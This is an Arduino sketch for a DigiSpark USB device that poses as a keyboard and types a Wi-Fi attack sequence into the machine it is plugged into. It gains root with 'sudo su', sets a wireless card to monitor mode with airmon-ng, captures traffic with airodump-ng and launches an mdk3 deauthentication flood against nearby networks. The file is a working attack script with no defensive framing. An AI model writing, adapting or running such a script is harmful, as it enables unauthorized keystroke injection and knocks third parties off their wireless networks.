//To initiate MITM False Handshake Written By AmmarT
#include "DigiKeyboard.h"
void setup(){
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("clear");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  
  DigiKeyboard.print("echo Injector Attached");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  
  DigiKeyboard.print("sudo su");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  
//  DigiKeyboard.print("iwconfig");
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(10000);
  
  DigiKeyboard.print("airmon-ng start wlan1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  
//  DigiKeyboard.print("iwconfig");
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(5000);
  
//  DigiKeyboard.print("screen -ls");
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(1000);

  DigiKeyboard.print("screen -S Monitor");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("airodump-ng wlan1mon");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_A,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_D,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("screen -S DEAUTH");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("mdk3 wlan1mon d ");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(30000);
  DigiKeyboard.sendKeyStroke(KEY_A,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_D,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("screen -r Monitor");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(;;){
  }
}
